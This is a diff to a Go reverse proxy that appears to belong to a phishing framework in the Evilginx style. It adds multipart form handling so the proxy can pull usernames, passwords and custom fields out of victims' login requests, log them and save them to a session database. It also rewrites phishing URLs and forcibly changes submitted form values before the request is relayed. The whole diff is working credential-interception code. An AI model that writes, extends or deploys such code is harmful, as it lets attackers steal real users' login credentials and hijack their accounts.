@@ -31,6 +31,9 @@ import (
 	"strings"
 	"sync"
 	"time"
+	"mime"
+	"mime/multipart"
+	"net/textproto"
 
 	"golang.org/x/net/proxy"
 
@@ -682,6 +685,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
 						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")
+						multipart_re := regexp.MustCompile("multipart\\/form-data")
 
 						if json_re.MatchString(contentType) {
 
@@ -758,7 +762,150 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Debug("force_post: body: %s len:%d", body, len(body))
 								}
 							}
+						} else if multipart_re.MatchString(contentType) {
+							if req.ParseMultipartForm(32 << 20) == nil && req.MultipartForm != nil && len(req.MultipartForm.Value) > 0 {
+								log.Debug("POST: %s", req.URL.Path)
 
+								for k, v := range req.MultipartForm.Value {
+									// patch phishing URLs in POST params with original domains
+
+									if pl.username.tp == "post/multipart" {
+										if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
+											um := pl.username.search.FindStringSubmatch(v[0])
+											if um != nil && len(um) > 1 {
+												p.setSessionUsername(ps.SessionId, um[1])
+												log.Success("[%d] Username: [%s]", ps.Index, um[1])
+												if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+													log.Error("database: %v", err)
+												}
+											}
+										}
+									}
+									if pl.password.tp == "post/multipart" {
+										if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
+											pm := pl.password.search.FindStringSubmatch(v[0])
+											if pm != nil && len(pm) > 1 {
+												p.setSessionPassword(ps.SessionId, pm[1])
+												log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+												if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+													log.Error("database: %v", err)
+												}
+											}
+										}
+									}
+									for _, cp := range pl.custom {
+										if cp.tp == "post/multipart" {
+											if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
+												cm := cp.search.FindStringSubmatch(v[0])
+												if cm != nil && len(cm) > 1 {
+													p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
+													log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+													if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
+														log.Error("database: %v", err)
+													}
+												}
+											}
+										}
+									}
+								}
+								for k, v := range req.MultipartForm.Value {
+									req.MultipartForm.Value[k][0] = string(p.patchUrls(pl, []byte(v[0]), CONVERT_TO_ORIGINAL_URLS))
+								}
+
+								// force posts
+								for _, fp := range pl.forcePost {
+									if fp.tp == "post/multipart" {
+										if fp.path.MatchString(req.URL.Path) {
+											log.Debug("force_post: url matched: %s", req.URL.Path)
+											ok_search := false
+											if len(fp.search) > 0 {
+												k_matched := len(fp.search)
+												for _, fp_s := range fp.search {
+													for k, v := range req.MultipartForm.Value {
+														if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
+															if k_matched > 0 {
+																k_matched -= 1
+															}
+															log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
+															break
+														}
+													}
+													for k, _ := range req.MultipartForm.File {
+														if fp_s.key.MatchString(k) {
+															if k_matched > 0 {
+																k_matched -= 1
+															}
+															log.Debug("force_post: [%d] matched - %s", k_matched, k)
+															break
+														}
+													}
+												}
+												if k_matched == 0 {
+													ok_search = true
+												}
+											} else {
+												ok_search = true
+											}
+
+											if ok_search {
+												for _, fp_f := range fp.force {
+													req.MultipartForm.Value[fp_f.key][0] = fp_f.value
+												}
+											}
+										}
+									}
+								}
+
+								buf := &bytes.Buffer{}
+								mpw := multipart.NewWriter(buf)
+
+								_, params, err := mime.ParseMediaType(req.Header.Get("Content-Type"))
+								if err != nil {
+									log.Error("%v", err)
+								}
+
+								mpw.SetBoundary(params["boundary"])
+								for k, v := range req.MultipartForm.Value {
+									log.Debug("POST %s = %s", k, v[0])
+
+									w, err := mpw.CreateFormField(k)
+									if err != nil {
+										log.Error("%v", err)
+									}
+
+									w.Write([]byte(v[0]))
+								}
+
+								for k, fheaders := range req.MultipartForm.File {
+									for _, fheader := range fheaders {
+										// cannot call CreateFormFile since it defaults to application/octet-stream
+										h := make(textproto.MIMEHeader)
+										h.Set("Content-Disposition", fmt.Sprintf(`form-data; name="%s"; filename="%s"`, k, fheader.Filename))
+										h.Set("Content-Type", fheader.Header["Content-Type"][0])
+
+										fw, err := mpw.CreatePart(h)
+										if err != nil {
+											log.Error("%s", err)
+										}
+
+										file, err := fheader.Open()
+										if err != nil {
+											log.Error("%v", err)
+										}
+
+										defer file.Close()
+										io.Copy(fw, file)
+									}
+								}
+
+								err = mpw.Close()
+								if err != nil {
+									log.Error("%v", err)
+								}
+
+								body = buf.Bytes()
+								req.ContentLength = int64(len(body))
+							}
 						} else if form_re.MatchString(contentType) {
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
@@ -767,34 +914,40 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								for k, v := range req.PostForm {
 									// patch phishing URLs in POST params with original domains
 
-									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
-										um := pl.username.search.FindStringSubmatch(v[0])
-										if um != nil && len(um) > 1 {
-											p.setSessionUsername(ps.SessionId, um[1])
-											log.Success("[%d] Username: [%s]", ps.Index, um[1])
-											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-												log.Error("database: %v", err)
+									if pl.username.tp == "post" {
+										if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
+											um := pl.username.search.FindStringSubmatch(v[0])
+											if um != nil && len(um) > 1 {
+												p.setSessionUsername(ps.SessionId, um[1])
+												log.Success("[%d] Username: [%s]", ps.Index, um[1])
+												if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+													log.Error("database: %v", err)
+												}
 											}
 										}
 									}
-									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
-										pm := pl.password.search.FindStringSubmatch(v[0])
-										if pm != nil && len(pm) > 1 {
-											p.setSessionPassword(ps.SessionId, pm[1])
-											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-												log.Error("database: %v", err)
+									if pl.password.tp == "post" {
+										if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
+											pm := pl.password.search.FindStringSubmatch(v[0])
+											if pm != nil && len(pm) > 1 {
+												p.setSessionPassword(ps.SessionId, pm[1])
+												log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+												if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+													log.Error("database: %v", err)
+												}
 											}
 										}
 									}
 									for _, cp := range pl.custom {
-										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
-											cm := cp.search.FindStringSubmatch(v[0])
-											if cm != nil && len(cm) > 1 {
-												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
-												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
-												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
-													log.Error("database: %v", err)
+										if cp.tp == "post" {
+											if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
+												cm := cp.search.FindStringSubmatch(v[0])
+												if cm != nil && len(cm) > 1 {
+													p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
+													log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+													if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
+														log.Error("database: %v", err)
+													}
 												}
 											}
 										}
@@ -819,36 +972,38 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 								// force posts
 								for _, fp := range pl.forcePost {
-									if fp.path.MatchString(req.URL.Path) {
-										log.Debug("force_post: url matched: %s", req.URL.Path)
-										ok_search := false
-										if len(fp.search) > 0 {
-											k_matched := len(fp.search)
-											for _, fp_s := range fp.search {
-												for k, v := range req.PostForm {
-													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
-														if k_matched > 0 {
-															k_matched -= 1
+									if fp.tp == "post" {
+										if fp.path.MatchString(req.URL.Path) {
+											log.Debug("force_post: url matched: %s", req.URL.Path)
+											ok_search := false
+											if len(fp.search) > 0 {
+												k_matched := len(fp.search)
+												for _, fp_s := range fp.search {
+													for k, v := range req.PostForm {
+														if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
+															if k_matched > 0 {
+																k_matched -= 1
+															}
+															log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
+															break
 														}
-														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
-														break
 													}
 												}
-											}
-											if k_matched == 0 {
+												if k_matched == 0 {
+													ok_search = true
+												}
+											} else {
 												ok_search = true
 											}
-										} else {
-											ok_search = true
-										}
 
-										if ok_search {
-											for _, fp_f := range fp.force {
-												req.PostForm.Set(fp_f.key, fp_f.value)
+											if ok_search {
+												for _, fp_f := range fp.force {
+													req.PostForm.Set(fp_f.key, fp_f.value)
+												}
+												body = []byte(req.PostForm.Encode())
+												req.ContentLength = int64(len(body))
+												log.Debug("force_post: body: %s len:%d", body, len(body))
 											}
-											body = []byte(req.PostForm.Encode())
-											req.ContentLength = int64(len(body))
-											log.Debug("force_post: body: %s len:%d", body, len(body))
 										}
 									}
 								}
